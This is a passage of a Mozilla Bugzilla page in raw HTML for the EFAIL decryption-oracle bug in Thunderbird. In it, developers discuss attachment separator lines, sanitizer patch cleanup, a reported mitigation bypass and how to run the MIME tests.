  </div><div id="att-8976703"
         class="attachment obsolete"
         data-id="8976703" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="tb-efail-attachment-separators.png">
      <meta itemprop="contentSize" content="50228">
      <meta itemprop="encodingFormat" content="image/png">
      <div class="label">
        Attached image
          <a class="link lightbox" href="attachment.cgi?id=8976703" itemprop="contentUrl">
        <span id="att-8976703-description" itemprop="description">tb-efail-attachment-separators.png</span></a> (obsolete)
        — <a href="attachment.cgi?id=8976703&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-118" data-comment-id="13285702"><span class="quote">&gt; &gt; The horizontal lines</span >

<span class="quote">&gt; Honestly, I don't know where they come from</span >

I found out. These are the inline attachment delimiters that Thunderbird always puts between the different documents/attachments.

You can easily reproduce that by sending yourself an email with HTML attachments (or plaintext, for that matter). You will see horizontal lines. For illustration, I used empty HTML documents, and opened them in a 52.8.0 without my patches, and made a screenshot, attached here.

In the screenshot, you will see &quot;empty.html&quot; in the line, which makes the purpose of these lines clear. That's obviously the file name of the attachment shown, and the name is taken from the MIME headers Content-Type: name=&quot;&quot; or Content-Disposition: filename=&quot;&quot;.

Now, when you open the attack email in a 52.8.0, you don't see these lines. But you should. That you don't see them is an effect of the attack in action and code failing to do what's intended. We never intended for an S/MIME part to be between 2 HTML parts.

When you open the attack email with my patch, you see the attachment separator lines again. That's not a bug, but actually the normal Thunderbird behavior (see above), and a sign of things working normally.
So, why is the filename missing? Remember that the attack emails are hand-crafted, so they're not playing as nice. They do not contain the file name, just &quot;Content-Type: text/html&quot;, no name=&quot;&quot;, nothing else, and no other MIME header. So, we don't have a file name to display, and we do the only reasonable thing we can do: display a horizontal line between the different attachments. Given that the attachments are themselves empty, you end up seeing only these lines.

This test email is looking odd only because it's a specifically crafted attack email with no content, no filename, odd MIME output etc..

So, in fact, these lines are working as they should.</pre></div><div class="change-set" id="c119"><div class="comment" data-id="13285708" data-no="119"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-119" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15265139_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-119"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-119" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c119">Comment 119</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 14:19 PDT" data-time="1526591962">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-119">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-119" data-comment-id="13285708">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976703" name="attach_8976703" title="tb-efail-attachment-separators.png">attachment 8976703</a> <a href="/attachment.cgi?id=8976703&amp;action=edit" title="tb-efail-attachment-separators.png">[details]</a></span>
tb-efail-attachment-separators.png

(Obsoleting screenshot, because it's only answering Jörg's valid question, but not otherwise adding value to this bug.)</pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976703&amp;action=edit"
           title="tb-efail-attachment-separators.png"
           class=""
        >Attachment #8976703</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c120"><div class="comment" data-id="13285749" data-no="120"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-120" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15265139_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-120"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-120" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c120">Comment 120</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 14:32 PDT" data-time="1526592776">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-120">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div id="att-8976711"
         class="attachment"
         data-id="8976711" itemscope itemtype="http://schema.org/MediaObject">
      <meta itemprop="name" content="horizontal lines.png">
      <meta itemprop="contentSize" content="10570">
      <meta itemprop="encodingFormat" content="image/png">
      <div class="label">
        Attached image
          <a class="link lightbox" href="attachment.cgi?id=8976711" itemprop="contentUrl">
        <span id="att-8976711-description" itemprop="description">horizontal lines.png</span></a>
        — <a href="attachment.cgi?id=8976711&amp;action=edit" itemprop="url">Details</a>
      </div>
    </div>

  
    <pre
        class="comment-text  "
        id="ct-120" data-comment-id="13285749">Richard, could you please load the e-mail in <span class=""><a href="/attachment.cgi?id=8975458" name="attach_8975458" title="A1-dec-pgp-smime-html-reply.eml">attachment 8975458</a> <a href="/attachment.cgi?id=8975458&amp;action=edit" title="A1-dec-pgp-smime-html-reply.eml">[details]</a></span> (which you encoded for me a little while ago) and apply patch &quot;Separate MIME parts from each other, v4 (trunk and 52)&quot;. You should see what is shown in the picture. Sadly the horizontal lines have no margin/padding. Could you find our their class and add CSS to make the thing look a bit better.</pre></div><div class="change-set" id="c121"><div class="comment" data-id="13285751" data-no="121"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-121" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15265139_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-121"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-121" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c121">Comment 121</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 14:33 PDT" data-time="1526592815">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-121">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-121" data-comment-id="13285751">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976351" name="attach_8976351" title="Sanitizer code cleanup, v2">attachment 8976351</a> <a href="/attachment.cgi?id=8976351&amp;action=edit" title="Sanitizer code cleanup, v2">[details]</a> <a href="/attachment.cgi?id=8976351&amp;action=diff" title="Sanitizer code cleanup, v2">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976351'>[review]</a>
Sanitizer code cleanup, v2

<span class="quote">&gt; I don't care much about the pref,</span >

Thanks for being pragmatic, Magnus.

Given that I AllowStyles doesn't actually work with CIDOnly, it would need the mozilla-central hunk from Sanitize composer, v4 patch, it makes sense to remove that part from the patch. That then also makes the pref name change moot, so I can revert that as well. That would make this &quot;cleanup&quot; a pure code cleanup with no functional changes. So, it's for trunk only anyway.

<span class="quote">&gt; but this (and other patches) need to apply to trunk</span >

Yes.

I'll try to make patches for trunk, but I can't promise it, because I'm running out of work time on this here.</pre></div><div class="change-set" id="c122"><div class="comment" data-id="13285784" data-no="122"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-122" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15265139_176914"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-122"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-122" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c122">Comment 122</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 14:47 PDT" data-time="1526593653">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-122">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-122" data-comment-id="13285784">(In reply to Jens Müller from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c109">comment #109</a>)
<span class="quote">&gt; [Hanno Böck] found a bypass for the current mitigation which may be interesting :)</span >

I've emailed him, and he sent me the exploit. I've filed <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE"
   href="/show_bug.cgi?id=1462473">bug 1462473</a> and attached the email.

My fixes in this bug here fix that attack, too.</pre></div><div class="change-set" id="c123"><div class="comment" data-id="13285790" data-no="123"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-123" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15265139_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-123"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-123" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c123">Comment 123</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 14:48 PDT" data-time="1526593738">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-123">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-123" data-comment-id="13285790">(In reply to Ben Bucksch (:BenB) from <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c117">comment #117</a>)
<span class="quote">&gt; Is there anything that you're missing in <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c57">comment 57</a>, which gives the big
&gt; overview?
&gt; And the comments when I attached the patches, e.g. <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c69">comment 69</a>, <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c73">comment 73</a>
&gt; and <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c92">comment 92</a> and <a class="bz_bug_link
          bz_status_VERIFIED bz_closed"
   title="VERIFIED FIXED - [efail] S/MIME and PGP decryption oracles can be built with HTML emails"
   href="/show_bug.cgi?id=1419417#c97">comment 97</a>?</span >
Thanks, I reread that. It's still unclear why we can't kill mimeInlineTextHTMLClass. I'm not familiar with (pseudo-)&quot;classes&quot; in MIME, as far as I know the code, it's a mess of passing function pointers around and has little to do with OO design or a C++ class hierarchy. Mercurial can certainly resurrect old code if necessary.

<span class="quote">&gt; &gt; The horizontal lines
&gt; Honestly, I don't know where they come from, but they are not coming from my
&gt; code.</span >
I've asked Richard to look into some CSS for them.

<span class="quote">&gt; I don't have the test suite set up, and last time I tried, it cost me a
&gt; whole day to get it running. Could you please help me out there adapting the
&gt; tests? That would be much appreciated.</span >
Very simple, you add |ac_add_options --enable-tests| to your .mozconfig.
You run the tests, assuming M-C as top source dir with:
./mach xpcshell-test comm/mailnews/db/gloda/test/unit/test_mime_attachments_size.js
./mach xpcshell-test comm/mailnews/db/gloda/test/unit/test_mime_emitter.js
Otherwise it's:
mozilla/mach xpcshell-test mailnews/db/gloda/test/unit/test_mime_attachments_size.js

The latter failure looks trivial:
&quot;&lt;html&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;I am HTML! Woo! &lt;/body&gt;&lt;/html&gt;&quot; ==
&quot;&lt;html&gt;&lt;head&gt;\\n&lt;meta http-equiv=\\&quot;content-type\\&quot; content=\\&quot;text/html; \\&quot;&gt;&lt;/head&gt;&lt;body&gt;I am HTML! Woo! \\n\\n&lt;/body&gt;&lt;/html&gt;&quot;
Looks like you just need to change the test expectancy here.

(As you know, my contract is currently on hold, so I'm back to volunteer status and I exhausted the promised volunteer hours for this week already fixing bustages so we can actually run tests and land these patches when ready. I trust you understand that I won't be able to assist further.)</pre></div><div class="change-set" id="c124"><div class="comment" data-id="13285791" data-no="124"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-124" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a15265139_176914"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a15265139_176914"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-124"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-124" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c124">Comment 124</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 14:49 PDT" data-time="1526593786">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-124">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-124" data-comment-id="13285791">Please CC the usual suspects on <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE"
   href="/show_bug.cgi?id=1462473">bug 1462473</a>.</pre><div class="activity"><div class="change">Flags: <span class="activity-deleted">needinfo?(jens.a.mueller)</span></div></div></div><div class="change-set" id="a15319315_22599"><div class="change" id="aa15319315_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15319315_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15319315_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15319315_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15319315_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15319315_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 14:56 PDT" data-time="1526594206">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">See Also:  &rarr; <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - HTML Sanitizer class cleanup"
   href="/show_bug.cgi?id=1462481">1462481</a></div></div></div><div class="change-set" id="a15319398_22599"><div class="change" id="aa15319398_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15319398_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15319398_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15319398_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15319398_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15319398_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 14:58 PDT" data-time="1526594289">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976085&amp;action=edit"
           title="Sanitizer code cleanup"
           class=""
        >Attachment #8976085</a> -
        Attachment is obsolete: false</div></div></div><div class="change-set" id="c125"><div class="comment" data-id="13285880" data-no="125"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-125" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15319398_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15319398_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-125"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-125" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c125">Comment 125</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 15:15 PDT" data-time="1526595325">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-125">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-125" data-comment-id="13285880">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976085" name="attach_8976085" title="Sanitizer code cleanup">attachment 8976085</a> <a href="/attachment.cgi?id=8976085&amp;action=edit" title="Sanitizer code cleanup">[details]</a> <a href="/attachment.cgi?id=8976085&amp;action=diff" title="Sanitizer code cleanup">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976085'>[review]</a>
Sanitizer code cleanup

Sanitizer cleanup moved to <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - HTML Sanitizer class cleanup"
   href="/show_bug.cgi?id=1462481">bug 1462481</a></pre><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976085&amp;action=edit"
           title="Sanitizer code cleanup"
           class=""
        >Attachment #8976085</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="a15320447_22599"><div class="change" id="aa15320447_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15320447_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15320447_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15320447_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15320447_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15320447_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 15:15 PDT" data-time="1526595338">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976351&amp;action=edit"
           title="Sanitizer code cleanup, v2"
           class=""
        >Attachment #8976351</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="a15320880_22599"><div class="change" id="aa15320880_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15320880_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15320880_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15320880_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15320880_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15320880_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 15:22 PDT" data-time="1526595771">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED WONTFIX - Sanitize HTML quotes before sending them to the composer when replying"
   href="/show_bug.cgi?id=1462488">1462488</a></div></div></div><div class="change-set" id="c126"><div class="comment" data-id="13285927" data-no="126"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-126" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15320880_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15320880_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-126"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-126" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c126">Comment 126</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 15:35 PDT" data-time="1526596516">4 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-126">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-126" data-comment-id="13285927">Comment on <span class="bz_obsolete"><a href="/attachment.cgi?id=8976363" name="attach_8976363" title="Sanitize quotes, v4 (for 52)">attachment 8976363</a> <a href="/attachment.cgi?id=8976363&amp;action=edit" title="Sanitize quotes, v4 (for 52)">[details]</a> <a href="/attachment.cgi?id=8976363&amp;action=diff" title="Sanitize quotes, v4 (for 52)">[diff]</a></span> <a href='/page.cgi?id=splinter.html&amp;ignore=&amp;bug=1419417&amp;attachment=8976363'>[review]</a>
Sanitize quotes, v4 (for 52)

I've moved the &quot;sanitize quoted HTML&quot; part to <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED WONTFIX - Sanitize HTML quotes before sending them to the composer when replying"
   href="/show_bug.cgi?id=1462488">bug 1462488</a>.

I still think that this should be part of the fix here, in one way or another. But a separate bug allows easier discussion.</pre></div><div class="change-set" id="a15321639_22599"><div class="change" id="aa15321639_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15321639_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15321639_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15321639_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15321639_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15321639_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 15:35 PDT" data-time="1526596530">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976363&amp;action=edit"
           title="Sanitize quotes, v4 (for 52)"
           class=""
        >Attachment #8976363</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="a15321655_22599"><div class="change" id="aa15321655_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a15321655_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a15321655_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a15321655_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a15321655_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-05-17 15:35 PDT" data-time="1526596546">4 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">
        <a href="/attachment.cgi?id=8976377&amp;action=edit"
           title="Sanitize quotes, v2 vs. v4 - Screenshots"
           class=""
        >Attachment #8976377</a> -
        Attachment is obsolete: true</div></div></div><div class="change-set" id="c127"><div class="comment" data-id="13285941" data-no="127"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-127" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a15321655_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a15321655_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
